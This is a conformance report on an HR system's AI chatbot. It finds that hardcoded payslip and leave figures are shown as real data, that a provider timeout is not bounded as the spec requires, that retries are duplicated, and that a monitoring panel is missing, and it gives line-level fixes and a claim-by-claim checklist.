# Conformance Report: HRMS Chatbot (AI Copilot) — Reliability, Trust & Failure Visibility

> **Spec:** [hrms_chatbot.md](../specs/subhrms/global/hrms_chatbot.md) (v3, 2026-08-25)
> **Verified:** 2026-08-27
> **Branch:** `feature/ai-chatbot-hardening`
> **Verdict:** **DOES NOT CONFORM** — *(2026-08-27: 9 of 11 findings resolved by `/webkit.fix`; see §8 Resolution. F9 and F11 remain open pending a spec decision.)*
> **Coverage:** 101 claims — 82 conforms, 8 violated, 2 absent, 5 unverified, 4 out-of-scope

---

## 1. Summary

The security core of this spec (Decisions 4, 5, 6) and the overlay/mount work (Decisions 11, 12) are
implemented and hold up under refutation. The **failure-visibility core (Decision 1) does not**, for a
reason the Definition of Done's own grep could never catch: the fabricated data was never named `mock*`.

`grep -rn "mock" resources/views/web/src/components/Chatbot/` returns nothing, and the DoD box was
ticked on that basis — but **five hardcoded HR figures survive under other names**, on both sides of
the wire. The most serious is a payslip: [`McpInternalController.php:552-558`](../../app/Http/Controllers/AI/McpInternalController.php#L552-L558)
returns `basic_salary 1250.00 / net_pay 1314.50` whenever an employee has no `YtdDetail` row, and
[`HRMSChatbot.vue:825-831`](../../resources/views/web/src/components/Chatbot/HRMSChatbot.vue#L825-L831)
seeds the payslip card with **the identical numbers**. An employee whose payroll has not been run is
told, in a confident sentence with a formatted card, that their take-home pay is $1,314.50. That is
the exact defect §1 opens with — "the system fabricates an answer instead of reporting an error" —
relocated, not removed.

Separately, the Gemini call is **not** bounded at 30s as Decision 9 requires: `retry()` retries on
timeout, so a hung provider holds a worker for ~91s, not the ~35s AC-4 specifies.

| Severity | Count | Must fix before |
| :--- | :---: | :--- |
| CRITICAL | 1 | anything ships |
| HIGH | 4 | the feature is done |
| MEDIUM | 4 | end of milestone |
| LOW | 2 | — |

---

## 2. Findings

### F1 — `payroll.payslip` returns invented salary figures when no payslip exists · `CRITICAL` · `VIOLATED` · ✅ FIXED

- **Claim:** §6.1 — "**No fabricated HR data.** Any figure shown to a user must trace to a tool result"; Decision 1 — "an HRMS assistant that invents leave balances and payslip figures is worse than one that is visibly down"
- **Spec source:** §6.1, Decision 1, Decision 8
- **Expected:** An employee with no payroll record gets an honest "no payslip available" answer.
- **Actual:** The tool invents one — [`McpInternalController.php:552-558`](../../app/Http/Controllers/AI/McpInternalController.php#L552-L558):
  ```php
  return $payslip ? $payslip->toArray() : [
      'period' => 'June 01 - June 15, 2026',
      'basic_salary' => 1250.00,
      'allowances' => 150.00,
      'deductions' => 85.50,
      'net_pay' => 1314.50
  ];
  ```
- **Failure scenario:** A newly-hired employee (no `YtdDetail` row) asks "show my payslip". `payroll.payslip` runs, is authorized, and is audited `status='success'`. The model receives the figures as fact and answers "Your net take-home for June 01–15 is $1,314.50." The `payslip` rich card renders the same numbers. Nothing anywhere — not the audit log, not the transcript, not the UI — records that the figures were invented.
- **Proof:** `grep -n "'basic_salary' => 1250.00" app/Http/Controllers/AI/McpInternalController.php` → line 554. The identical literals appear at `HRMSChatbot.vue:825-831`, so the two sides agree on the same fiction and no mismatch surfaces.
- **Fix target:** `code`
- **Suggested fix:** In `McpInternalController::runToolLogic()`, `case 'payroll.payslip'`, replace the `: [...]` fallback with `return ['error' => 'No payslip has been generated for this employee yet.'];`. Per §6.2 ("Tool returns `['error' => …]` → fed back to the model, which explains it in prose"), that path already exists and needs no new handling.
- **Effort:** `trivial`
- **Regression risk:** None. The `['error' => ...]` shape is already returned by the `!$account` branch three lines above and is consumed correctly by `toRichDataEnvelope()`, which returns `null` for errored tools so no card renders.

### F2 — Frontend card state is seeded with hardcoded HR figures that survive a failed fetch · `HIGH` · `VIOLATED` · ✅ FIXED

- **Claim:** §6.1 — "No fabricated HR data"; Decision 1 Option A — "All `mock*` constants that exist only to feed the fallback are deleted"
- **Spec source:** §6.1, Decision 1, §9 DoD
- **Expected:** No hardcoded HR figure renders. Ever.
- **Actual:** Three refs carry live-looking defaults — [`HRMSChatbot.vue:812`](../../resources/views/web/src/components/Chatbot/HRMSChatbot.vue#L812) (`employeeAttendance`), [`:825`](../../resources/views/web/src/components/Chatbot/HRMSChatbot.vue#L825) (`employeePayslip` — $1,250.00 / $1,314.50), [`:833`](../../resources/views/web/src/components/Chatbot/HRMSChatbot.vue#L833) (`rosterSchedule` — a full Mon–Fri shift week). Both fetches swallow failure to `console.warn` and leave the seeds in place: [`:897`](../../resources/views/web/src/components/Chatbot/HRMSChatbot.vue#L897), [`:913`](../../resources/views/web/src/components/Chatbot/HRMSChatbot.vue#L913).
- **Failure scenario:** `GET /api/employee/dashboard` returns 500. The user asks "show my payslip". The card renders **$1,250.00 basic / $1,314.50 net** with no error indication. This is the identical shape of the fallback Decision 1 deleted from `sendMessage()` — a `catch` that hides a dependency failure behind plausible data — left intact one screen away.
- **Proof:** `sed -n '905,915p' HRMSChatbot.vue` shows the catch, and the refs are never reset on failure. The DoD grep passes because these are named `employeePayslip`, not `mockPayslip`.
- **Fix target:** `code`
- **Suggested fix:** Initialise all three refs to `null` (or `[]` for `rosterSchedule`), add `v-if` guards on the `payslip` / `roster` / `attendance-summary` card blocks so they render nothing without data, and set an error flag in each `catch` so the bubble can say the data could not be loaded. Same principle as `leaveBalanceCards()`, which already guards with `&& leaveBalanceCards(msg.data).length`.
- **Effort:** `small` (one file)
- **Regression risk:** The three cards render blank until the lazy fetch resolves — an honest state, but visibly different from today.

### F3 — `LeaveBalanceTool` invents 10/15/5 credits when the employee has no leave record · `HIGH` · `VIOLATED` · ✅ FIXED

- **Claim:** AC-23 / §6.1 — the card displays "the values from the tool result, not `12`/`8`"
- **Spec source:** §6.1, Decision 8 Option A ("Wire `leave-balance` to the real `leave.balance` result")
- **Expected:** The card shows the employee's real credits, or the tool reports it has none.
- **Actual:** [`LeaveBalanceTool.php:33-39`](../../app/Mcp/Tools/LeaveBalanceTool.php#L33-L39) returns hardcoded `Sick 10/10, Vacation 15/15, Emergency 5/5` when `AccountLeave` is empty.
- **Failure scenario:** An employee with no `AccountLeave` rows asks "what's my leave balance?" The card renders 10 / 15 / 5 as real balances. They file leave against credits they do not have. AC-23 passes its literal test (the card *does* read the tool result) while the spec's actual intent fails — the fabrication moved one layer down, out of the AC's reach.
- **Proof:** `sed -n '32,40p' app/Mcp/Tools/LeaveBalanceTool.php`. AC-23 only constrains the frontend, so this survived it.
- **Fix target:** `code`
- **Suggested fix:** Replace the `if ($balances->isEmpty())` block in `LeaveBalanceTool::run()` with `return ['error' => 'No leave credits are on record for this employee.'];`.
- **Effort:** `trivial`
- **Regression risk:** None — same `['error' => ...]` path as F1.

### F4 — The Gemini call is not bounded at 30s: `retry()` re-retries on timeout · `HIGH` · `VIOLATED` · ✅ FIXED

- **Claim:** AC-4 — "Gemini does not respond within 30s → Request returns within ~35s with `504` … **no PHP-FPM worker is held past that**"
- **Spec source:** AC-4, Decision 9 Option A, §6.2
- **Expected:** ~35s worst case.
- **Actual:** ~91s. [`AIService.php:542-545`](../../app/Services/AIService.php#L542-L545) uses `->timeout(30)->connectTimeout(5)->retry(2, 500, throw: false)`. `throw: false` suppresses throwing on a failed *response*; it does not stop retrying on a *connection* failure. A read timeout surfaces as `ConnectionException`, and Laravel's retry predicate defaults to `true` for it.
- **Failure scenario:** Gemini accepts the connection and never responds. Attempt 1 times out at 30s → retry → 30s → retry → 30s ≈ **91s** with sleeps, then `ConnectionException`. One PHP-FPM worker is held nearly 2.6× the spec's bound; N concurrent users exhaust the pool — the precise resource problem §1 point A describes. The client aborts at 45s and shows `provider_timeout`, so **the user never sees the overrun and neither does the log** — the worker keeps running invisibly.
- **Proof:** [`PendingRequest.php:1123-1124`](../../vendor/laravel/framework/src/Illuminate/Http/Client/PendingRequest.php#L1123-L1124) — `$result = $shouldRetry !== null ? $shouldRetry : ($this->retryWhenCallback ? … : true)`. `$shouldRetry` is only assigned in the response branch and reset to `null` each pass; `retryWhenCallback` is `null` because no `$when` argument was passed. Predicate → `true`. Line 1110 confirms `ConnectException` is marshalled into `ConnectionException` and rethrown into that predicate.
- **Fix target:** `code`
- **Suggested fix:** Pass a `$when` predicate that declines to retry connection failures: `->retry(2, 500, fn ($e) => ! $e instanceof \Illuminate\Http\Client\ConnectionException, throw: false)`. Retries then apply only to 4xx/5xx responses (AC-3's case), and a timeout fails after one attempt at ~30s (AC-4's case).
- **Effort:** `trivial`
- **Regression risk:** None — AC-3 (HTTP 500 ×3) still gets its 3 attempts; only the timeout path short-circuits, which is what AC-4 asks for.

### F5 — Three rich cards ignore the tool's `empid` and render the viewer's own data · `HIGH` · `VIOLATED` · ✅ FIXED (different fix than suggested — see §8)

- **Claim:** §6.1 — "No fabricated HR data. Any figure shown to a user must trace to a tool result"; Decision 7 — the envelope exists so a card renders *that tool's* payload
- **Spec source:** §6.1, Decision 7, Decision 8
- **Expected:** A card rendered for a tool result shows that result.
- **Actual:** [`AIService.php:51-53`](../../app/Services/AIService.php#L51-L53) maps `roster.view → roster`, `payroll.payslip → payslip`, `attendance.summary → attendance-summary`, so those tools now trigger cards. But the cards read module-local state fetched for the **logged-in user**, not `msg.data`: [`HRMSChatbot.vue:589`](../../resources/views/web/src/components/Chatbot/HRMSChatbot.vue#L589) (`v-for="roster in rosterSchedule"`), [`:604`](../../resources/views/web/src/components/Chatbot/HRMSChatbot.vue#L604) (`employeePayslip.pay_period`).
- **Failure scenario:** A Timekeeper (role 5) asks "show EMP009's roster". `McpToolPolicy` allows it (role 5 has `roster.view`), the tool returns EMP009's timesheet, the model narrates EMP009's schedule — and the card underneath renders **the timekeeper's own** week from `/api/employee/shift_schedule`. Same for a Payroll Auditor (role 6, has `payroll.payslip`) querying any employee's payslip: the card shows the auditor's figures, or F2's hardcoded seed. Text and card disagree, and the card looks authoritative. Role 3 is unaffected (`empid` is forced to self), which is why this is invisible in employee-portal testing.
- **Proof:** `grep -n "roster.view\|payroll.payslip\|attendance.summary" app/Policies/McpToolPolicy.php` → roles 2, 4, 5 hold `roster.view`; roles 3, 6 hold `payroll.payslip`; roles 2, 3, 5 hold `attendance.summary`. The card templates reference no `msg.data` anywhere.
- **Fix target:** `code`
- **Suggested fix:** Narrow the `$toolCards` map in `AIService.php` to the tools whose payload the cards actually consume — remove `roster.view`, `payroll.payslip`, and `attendance.summary` entries, leaving those three cards on their existing dashboard-fed self-service path (§5.2's stated intent: "already live from `/api/employee/shift_schedule` + `/api/employee/dashboard`"). Wiring them to real tool payloads is the §8 per-tool follow-up.
- **Effort:** `trivial` (3 lines)
- **Regression risk:** Those cards stop appearing on tool-driven answers and render plain text instead — which is the Decision 8 Option A behaviour anyway.

### F6 — The admin AI-health panel was never built · `MEDIUM` · `ABSENT` · ✅ FIXED

- **Claim:** Build Order step 10 — "`GetAiHealthQuery` + `AiHealthController` + **admin panel** — the failure-finding surface"; Decision 2 Option A — "Surface it on the existing Admin dashboard"
- **Spec source:** §7 step 10, Decision 2
- **Expected:** An admin-visible surface for failure counts, denials, and p95.
- **Actual:** The query and endpoint exist ([`GetAiHealthQuery.php`](../../app/Queries/Ai/GetAiHealthQuery.php), [`AiHealthController.php`](../../app/Http/Controllers/admin/AiHealthController.php), `GET /api/admin/ai-health`). **Nothing consumes them.**
- **Failure scenario:** The stated purpose of Decision 2 is that "nobody is watching" failures. With no UI, nobody still is — the data is merely reachable by curl. AC-19/AC-20 pass (they only assert the endpoint), so the gap is invisible to the AC table.
- **Proof:** `grep -rn "ai-health\|aiHealth\|ai_health" resources/views/web/` → no matches.
- **Fix target:** `code`
- **Suggested fix:** Add an AI-health panel to the admin dashboard module (`resources/views/web/src/module/admin/dashboard/`), calling `GET /api/admin/ai-health` with a default 7-day range and rendering `total_turns`, `failures_by_code`, `denials_by_tool`, `p95_duration_ms`, and the `recent_failures` table.
- **Effort:** `small`
- **Regression risk:** None — additive.

### F7 — Retry persists a duplicate user message · `MEDIUM` · `VIOLATED` · ✅ FIXED (code side)

- **Claim:** AC-7 — "no duplicate user message is appended to the transcript"; §6.3 — "a retry after a failure yields exactly one user message"
- **Spec source:** AC-7, §6.3 Idempotency
- **Expected:** One user message per question, in the persisted transcript.
- **Actual:** The UI guarantee holds (`sendMessage(text, { isRetry: true })` skips the user bubble), but [`AIService.php:114-121`](../../app/Services/AIService.php#L114-L121) inserts a user row on **every** call, including the retry.
- **Failure scenario:** A turn fails with `provider_unconfigured`; the key is fixed; the user clicks Retry. `ai_chat_messages` now holds `user("balance?"), ai(status=error), user("balance?"), ai(answer)`. `GET /api/ai/history/{id}` (AC-11) renders the question twice, and the duplicate enters the newest-15 window, so the model sees it twice on the next turn.
- **Proof:** `grep -n "'sender' => 'user'," app/Services/AIService.php` → line 116, unconditional and before the key check.
- **Fix target:** `code`
- **Suggested fix:** Add `'retry_of_message_id' => 'nullable|integer'` to `ChatbotController::MESSAGE_RULES`, pass it from `requestTurn()` on retries, and have `AIService::chat()` skip the user-row insert (reusing the prior row) when it is present. Alternatively amend §6.3 to state the guarantee is UI-only — but that weakens AC-11.
- **Effort:** `small`
- **Regression risk:** Must not skip the insert on a first attempt, or the transcript loses the question entirely.

### F8 — An unexpected exception leaves a user row with no AI failure row · `MEDIUM` · `VIOLATED` · ✅ FIXED

- **Claim:** §6.3 Error shape — "**Every** failure also persists an AI row with `status='error'|'empty'`"
- **Spec source:** §6.3, Decision 3
- **Expected:** Every failed turn is a durable, replayable pair.
- **Actual:** `AIService::chat()` covers provider failures via `failTurn()`, but any other throw — `fetchMcpTools()` failing to resolve a Tool class, a JSON error, a DB error mid-loop — propagates to [`ChatbotController.php:106-116`](../../app/Http/Controllers/AI/ChatbotController.php#L106-L116), which returns 502 **without** writing an AI row. The user row was already written at `AIService.php:114`.
- **Failure scenario:** A malformed MCP tool schema makes `buildMcpToolDeclarations()` throw. The user sees the error bubble; `ai_chat_messages` holds an orphan user row and no AI row; the admin health panel's `failures_by_code` counts nothing. The turn is invisible to exactly the surface Decision 2 built to find it.
- **Proof:** `ChatbotController.php:109` logs and returns; no `ai_chat_messages` insert on that path.
- **Fix target:** `code`
- **Suggested fix:** Wrap the body of `AIService::chat()` after the user-row insert in `try { … } catch (\Throwable $e) { Log::error(...); return $this->failTurn($sessionId, 'error', 'provider_error'); }` so the persistence guarantee lives with the code that owns the table, and the controller's `catch` becomes a true last resort.
- **Effort:** `trivial`
- **Regression risk:** None — `failTurn()` already returns the shape the controller handles.

### F9 — AC-44 cannot be satisfied as written · `MEDIUM` · `SPEC-GAP` · ⏸ OPEN (spec decision)

- **Claim:** AC-44 — "The four contextual-nudge substrings (`payslip`, `finalpay`, `roster`/`schedule`, `approval`) … Every one resolves to a route where the launcher is mounted"
- **Spec source:** AC-44, Decision 12
- **Expected:** Satisfiable by choosing mount flags.
- **Actual:** Two of the four substrings match **no route in the application**: no path contains `finalpay` (they are `payroll/final-pay`, `timekeeping/final-pay-processing`) and none contains `approval` (they are `<portal>/approvers-menu`). A bare `schedule` matches `payroll/bir/schedule-1-alphalist-of-employees`, `payroll/bir/schedule-2-…`, and `payroll/prooflist/control-total-schedule` — so satisfying AC-44 literally would require mounting the assistant on BIR alphalist pages to serve a "Duty Roster is active" nudge.
- **Failure scenario:** Read literally, AC-44 forces three payroll reference tables to `chatbot: true`, contradicting Decision 12's own rationale (payroll = 83 routes, 3 tools). Read as intent, it requires changing the matcher, which no AC authorizes.
- **Proof:** `grep -rn "path:" **/*.routes.ts | grep -Ei "finalpay|approval"` → zero matches.
- **Fix target:** `spec` — AC-44 assumes the matcher is correct; it never was.
- **Suggested fix:** Amend AC-44 to: *"Every contextual-nudge trigger matches at least one real route, and every route it matches has `meta.chatbot === true`."* The implementation already satisfies that amended form (see §5).
- **Effort:** `trivial` (spec edit)
- **Regression risk:** None.

### F10 — Unreachable-but-live "Simulated success" branch · `LOW` · `UNSPECCED` · ✅ FIXED

- **Claim:** §6.1 — "No AI-initiated writes"; Decision 1 — remove fabrication
- **Actual:** [`McpInternalController.php:601-606`](../../app/Http/Controllers/AI/McpInternalController.php#L601-L606) returns `['info' => 'Simulated success for tool ' . $tool]` for any unmatched tool, and `executeFor()` audits it `status='success'`.
- **Failure scenario:** Not currently reachable — every tool declared in `AIService::fetchMcpTools()` has a matching `case` (verified by set difference). It becomes live the moment a tool is added to the catalog without a branch, or if the model emits an undeclared name; the user would then be told a write succeeded when nothing ran.
- **Proof:** `comm -23 <declared> <cases>` → empty. Latent, not live.
- **Fix target:** `code`
- **Suggested fix:** Change the `default:` branch to `return ['error' => 'Tool ' . $tool . ' is not implemented.'];`.
- **Effort:** `trivial`
- **Regression risk:** None while unreachable.

### F11 — Payroll mounts more routes than AC-43 describes · `LOW` · `VIOLATED` · ⏸ OPEN (spec decision)

- **Claim:** AC-43 — "The launcher appears only on the routes explicitly overridden to `chatbot: true` (payslip, run status)"
- **Actual:** Payroll mounts on `payroll/payroll-reports/payslip` plus **five** `payroll_processing` routes, plus `payroll/approvers-menu/*` (via `createApproverRoutes`).
- **Failure scenario:** A role-6 user sees the launcher on 9 payroll routes, not 2. Cosmetic; each still has a serving tool (`payroll.run_status`, `leave.approve`), and §6.2 explicitly directs approver routes to the "on" side — so this is AC-43 being narrower than §6.2, not an implementation error.
- **Fix target:** `spec` — reconcile AC-43's "(payslip, run status)" with §6.2's approver-routes row.
- **Suggested fix:** Amend AC-43 to name the payroll processing and approver routes, or tighten the overrides to payslip + `payroll/regular-cycle` only.
- **Effort:** `trivial`
- **Regression risk:** None.

---

## 3. Claim Checklist

### Acceptance Criteria (45)

| # | Claim | Verdict | Evidence |
| :--- | :--- | :--- | :--- |
| AC-1 | Key unset → 503 `provider_unconfigured` + error bubble, no leave figures | CONFORMS | `AIService.php:123-125`, `:66-70`; `useHRMSChatbot.js` `pushErrorMessage` |
| AC-2 | Failed turn persists `sender=ai, status=error, error_code, text=''` | CONFORMS | `AIService.php` `failTurn()` |
| AC-3 | Gemini 500 ×3 → 502 `provider_error`, no audit row, one error row | CONFORMS | `AIService.php:548-552`; no tool executed before failure |
| AC-4 | No response in 30s → returns ~35s, 504, worker not held past that | **VIOLATED** | **F4** — `AIService.php:544` retries on timeout → ~91s |
| AC-5 | 5 tool loops → 502 `tool_loop_exhausted`, row `status='empty'`, no mock reply | CONFORMS | `AIService.php:234` `if (! $completed \|\| trim(...) === '')` |
| AC-6 | No `mock*` constant in rendered DOM; grep returns 0 | CONFORMS (literal) | `grep -rn "mock" Chatbot/` → 0. See F2 — fabrication persists under other names |
| AC-7 | Retry re-sends same text/session; no duplicate user message | **VIOLATED** | **F7** — UI conforms; DB gains a second user row |
| AC-8 | B posts to A's session → 404, session unmodified, no rows, no leakage | CONFORMS | `ChatbotController.php:52-57` — check precedes the update |
| AC-9 | B GETs A's history → 404 | CONFORMS | `ChatbotController::history()` guard |
| AC-10 | B DELETEs A's session → 404, data intact | CONFORMS | `ChatbotController::clear()` guard |
| AC-11 | A GETs own history → 200, each message carries `status`/`error_code` | CONFORMS | `ChatbotController::history()` map |
| AC-12 | agent-chat with A's session → 404 | CONFORMS | `ChatbotController.php:138-143` |
| AC-13 | 40 messages → payload has 26–40, not 1–15 | CONFORMS | `AIService.php:574-580` `orderBy id desc limit 15 ->reverse()`. See §5 — extra `status='ok'` filter |
| AC-14 | Role 3 + other empid → denied, audited `authorized=false` | CONFORMS | `McpToolPolicy.php:105-110`; `HrmsTool::handle()` |
| AC-15 | Manager + non-team empid → denied (stub regression) | CONFORMS | `McpToolPolicy.php:120-127` → `GetManagedEmployeesQuery::managesEmpid()` |
| AC-16 | Manager + team empid → 200, audited success | CONFORMS | same; `managedUnitIds()` includes descendants |
| AC-17 | Manager heading no unit → denied, no implicit global access | CONFORMS | `managedUnitIds()` returns `[]` → `managesEmpid()` false (fallback OFF by default) |
| AC-18 | Successful tool → `status=success`, non-null `duration_ms`, `engine` set | CONFORMS | `HrmsTool.php` `elapsedMs()`; `McpInternalController::executeFor()` |
| AC-19 | Admin GET ai-health → 200 with the 5 keys | CONFORMS | `GetAiHealthQuery::execute()`. See §5 — extra `start`/`end` keys |
| AC-20 | Role 3 GET ai-health → 403 exact message | CONFORMS | `AiHealthController.php:27-29` (role check precedes validation) |
| AC-21 | `POST /api/mcp/execute` → 404 | CONFORMS | `route:list --path=mcp` shows only `mcp/hrms` |
| AC-22 | `overtime.show_form` → `{"tool":"overtime-form","result":null}`, no write | CONFORMS | `toRichDataEnvelope()` unwrap; `$toolCards` |
| AC-23 | Card shows tool's 11.5 / 3, not 12 / 8 | CONFORMS (literal) | `HRMSChatbot.vue:271` `leaveBalanceCards(msg.data)`. See **F3** — the tool itself may invent |
| AC-24 | Migrated tool → `{tool,result}` envelope, not null | CONFORMS | `toRichDataEnvelope()` — `tool:null`, `result:payload` |
| AC-25 | Double-click Send → one POST, controls disabled | CONFORMS | `useHRMSChatbot.js` isLoading guard; `HRMSChatbot.vue:695` `:disabled` |
| AC-26 | Replayed POST creates a second pair; no write tool re-executes | CONFORMS | intentional; write tools unreachable per AC-22 |
| AC-27 | Empty/absent message → 422 "The message field is required." | CONFORMS | `MESSAGE_RULES`; Laravel 13 `validation.php:143` |
| AC-28 | 20,001 chars → 422 exact message, no Gemini call | CONFORMS | `max:20000`; validation precedes the service call |
| AC-29 | `session_id="abc"` → 422, no session created | CONFORMS | validation precedes `insertGetId` |
| AC-30 | portal/page/record absent → 200 with defaults | CONFORMS | `input('portal', 'Employee Portal')` |
| AC-31 | Unauthenticated → 401, no session row | CONFORMS | `auth:sanctum` (`route:list -v`) |
| AC-32 | Pagination button clickable with chatbot closed | UNVERIFIED | Browser-only; gutter + `pointer-events-none` present in code |
| AC-33 | Gutter ≥ 80px where mounted | CONFORMS | `DashboardLayout.vue:96` `pb-20` |
| AC-34 | `/messages` → no gutter | CONFORMS | `:class="{ 'pb-20': showChatbot }"`; `/messages` has no flag |
| AC-35 | Click 10px outside circle does nothing | CONFORMS | `pointer-events-none` on both rings + badge |
| AC-36 | Modal renders above launcher | CONFORMS | launcher `z-30`; modals `z-[100]`/`z-[110]` |
| AC-37 | Drawer above mobile sidebar, below modals | CONFORMS | drawer `z-[60]`; sidebar `z-50` |
| AC-38 | Launcher ≤64×64px, no label text nodes | CONFORMS | `p-2.5` + `w-8 h-8` ≈ 56px; tooltip is a sibling, `absolute`, out of flow |
| AC-39 | `chatbot` absent/false → launcher absent from DOM, no gutter | CONFORMS | `v-if="showChatbot"` |
| AC-40 | Portal `chatbot: true` inherited by child | CONFORMS | `vue-router@4.6.4` `mergeMetaFields(matched)` |
| AC-41 | Child `chatbot: false` overrides parent | CONFORMS | child meta wins in the merge |
| AC-42 | `grep -c "route.path !== '/messages'"` → 0 | CONFORMS | verified, returns 0 |
| AC-43 | Payroll launcher only on overridden routes (payslip, run status) | **VIOLATED** | **F11** — 9 routes mount |
| AC-44 | All four nudge substrings resolve to mounted routes | **SPEC-GAP** | **F9** — two match no route at all |
| AC-45 | on→off navigation unmounts launcher, drawer, gutter together | CONFORMS | single `v-if` + reactive class |

### Database — §3 (8)

| # | Claim | Verdict | Evidence |
| :--- | :--- | :--- | :--- |
| C1 | `ai_chat_messages.status` enum(ok,error,empty) default 'ok' | CONFORMS | `alters/ai_chat_messages/2026_08_25_000001_*.php` |
| C2 | `ai_chat_messages.error_code` varchar(64) nullable | CONFORMS | same |
| C3 | Index `(session_id, id)` | CONFORMS | `idx_ai_chat_messages_session_id_id` |
| C4 | `ai_audit_logs.duration_ms` unsignedInteger nullable | CONFORMS | `alters/ai_audit_logs/2026_08_25_000002_*.php` |
| C5 | `ai_audit_logs.engine` varchar(32) nullable | CONFORMS | same |
| C6 | Indexes `(created_at)`, `(tool_name, authorized)` | CONFORMS | same |
| C7 | Alters add **no** new FKs | CONFORMS | no `foreign()`/`constrained()` in either file |
| C8 | Migrations run cleanly | UNVERIFIED | No DB reachable — `migrate:status` fails to connect |

### Backend — §4 (11)

| # | Claim | Verdict | Evidence |
| :--- | :--- | :--- | :--- |
| C9 | `GetManagedEmployeesQuery::managedUnitIds()` | CONFORMS | `app/Queries/Team/GetManagedEmployeesQuery.php` |
| C10 | `…::managesEmpid()` | CONFORMS | same |
| C11 | `…::execute()` scoped to managed units | CONFORMS | same |
| C12 | 4 named call sites refactored onto it | CONFORMS | MyTeamController, GetDutyRosterQuery, GetManagementReportsQuery, tk/DutyRosterController (×2 — a 5th copy) |
| C13 | `GetAiHealthQuery` aggregates the 5 metrics | CONFORMS | `app/Queries/Ai/GetAiHealthQuery.php` |
| C14 | `resolveOwnedSession()` used by all 4 endpoints | CONFORMS | `ChatbotController.php` — chat, agentChat, history, clear |
| C15 | `/api/mcp/execute` deleted; in-process `Account` passed | CONFORMS | `executeFor(Account …)`; no `X-MCP-Token` |
| C16 | `GET /api/admin/ai-health` registered, roles 1/7 | CONFORMS | `routes/api/admin.php`; `route:list` |
| C17 | Response contract §4.5 — all 7 shapes | CONFORMS | `ChatbotController` + `AIService::FAILURES` |
| C18 | Raw exception text never returned | CONFORMS | `ChatbotController.php:106-116` returns a fixed message |
| C19 | `HrmsCopilot::messages()` newest-15 | CONFORMS | `HrmsCopilot.php:88-96` |

### Frontend — §5 (10)

| # | Claim | Verdict | Evidence |
| :--- | :--- | :--- | :--- |
| C20 | Mock fallback deleted from `sendMessage()` | CONFORMS | no `setTimeout` keyword matcher remains |
| C21 | Error bubble with reason + Retry | CONFORMS | `HRMSChatbot.vue:242-266` |
| C22 | `error_code` chip | CONFORMS | `StatusBadge` reused |
| C23 | 401 not rendered as a chat error | CONFORMS | `if (err?.status === 401 \|\| 419) return` |
| C24 | Error bubbles not persisted | CONFORMS | `saveHistory()` filters `type !== 'error'` |
| C25 | Ten unwired cards deleted | CONFORMS | 278 lines removed; 10 remaining types are the keep-list |
| C26 | `leave-balance` wired to `msg.data` | CONFORMS | `leaveBalanceCards()` |
| C27 | Keep roster / payslip / attendance-summary / 4 forms | CONFORMS (shape) | present — but see **F5** |
| C28 | Icon-only launcher, `pointer-events-none`, corrected z | CONFORMS | `HRMSChatbot.vue:7-63` |
| C29 | `showChatbot` reads merged route meta | CONFORMS | `DashboardLayout.vue:138` |

### Business Rules & Edge Cases — §6.1 / §6.2 (18)

| # | Claim | Verdict | Evidence |
| :--- | :--- | :--- | :--- |
| C30 | No AI-initiated writes; `*.apply` unreachable | CONFORMS | `CopilotInstructions` rule 3 unchanged; `*.show_form` path intact |
| C31 | Personal scope (role 3) | CONFORMS | `McpToolPolicy.php:105-110` |
| C32 | Portal separation — authz off `Account.role` | CONFORMS | `Account::getRoleAttribute()` → `role_access` |
| C33 | Team scope = `units.idhead` + descendants | CONFORMS | `GetManagedEmployeesQuery` |
| C34 | Audit trail on every attempt, allowed or denied | CONFORMS | `HrmsTool::handle()`; `executeFor()` |
| C35 | **No fabricated HR data** | **VIOLATED** | **F1, F2, F3, F5** |
| C36 | Gemini key unset → 503 + failure row | CONFORMS | `failTurn()` |
| C37 | Gemini 4xx/5xx → 2 retries → 502 | CONFORMS | `retry(2, 500)` |
| C38 | Gemini hangs → connectTimeout 5 / timeout 30 → 504 | **VIOLATED** | **F4** |
| C39 | Model loops 5× → 502, `status='empty'` | CONFORMS | `AIService.php:234` |
| C40 | Text but no tool → 200, `rich_data: null` | CONFORMS | `$richData` stays null |
| C41 | Tool returns `['error'…]` → prose, audit success, no bubble | CONFORMS | `toRichDataEnvelope()` returns `null` |
| C42 | Session > 15 messages → newest 15 chronological | CONFORMS | `loadSessionHistory()` |
| C43 | Session of another user → 404 everywhere | CONFORMS | `resolveOwnedSession()` |
| C44 | Session deleted mid-conversation → clear + retry as new | CONFORMS | `requestTurn(allowSessionReset)`; `skipNotFoundRedirect` |
| C45 | Manager heads no unit → all empid tools denied | CONFORMS | AC-17 |
| C46 | Role not in `rolePermissions` → all denied, audited | CONFORMS | `$rolePermissions[$role] ?? []` |
| C47 | `sticky bottom-0` table bars — residual accepted | UNVERIFIED | Browser-only; spec requires per-component confirmation |

### Non-Functional — §6.3 (5)

| # | Claim | Verdict | Evidence |
| :--- | :--- | :--- | :--- |
| C48 | Authorization — own sessions, 404 not 403, admin 403 | CONFORMS | `ChatbotController`, `AiHealthController` |
| C49 | Concurrency / double-submit — UI `isLoading` guard | CONFORMS | AC-25 |
| C50 | Idempotency — retry yields exactly one user message | **VIOLATED** | **F7** |
| C51 | Error shape — every failure persists an AI row | **VIOLATED** | **F8** |
| C52 | Validation boundaries — all 5 fields bounded | CONFORMS | `MESSAGE_RULES`; ai-health `start`/`end` + 90-day cap |

### Build Order & DoD — §7 / §9 (4 material)

| # | Claim | Verdict | Evidence |
| :--- | :--- | :--- | :--- |
| C53 | Step 10 — admin panel | **ABSENT** | **F6** |
| C54 | DoD — `mcp/execute` grep clean | CONFORMS | verified |
| C55 | DoD — `where('idhead'` in one place | CONFORMS | returns 0; walk lives only in `GetManagedEmployeesQuery` |
| C56 | DoD — Decision 12 defaults confirmed by the team | OUT-OF-SCOPE | Unconfirmed; spec marks it a product call |

---

## 4. Fix Plan

| Order | Finding | Severity | Change | File(s) | Effort |
| :---: | :--- | :--- | :--- | :--- | :--- |
| 1 | F1 | CRITICAL | Replace the hardcoded payslip fallback with `['error' => …]` | `app/Http/Controllers/AI/McpInternalController.php:552-558` | trivial |
| 2 | F3 | HIGH | Replace the hardcoded leave-credit fallback with `['error' => …]` | `app/Mcp/Tools/LeaveBalanceTool.php:33-39` | trivial |
| 3 | F4 | HIGH | Add a `$when` predicate declining to retry `ConnectionException` | `app/Services/AIService.php:542-545` | trivial |
| 4 | F5 | HIGH | Drop `roster.view`, `payroll.payslip`, `attendance.summary` from `$toolCards` | `app/Services/AIService.php:51-53` | trivial |
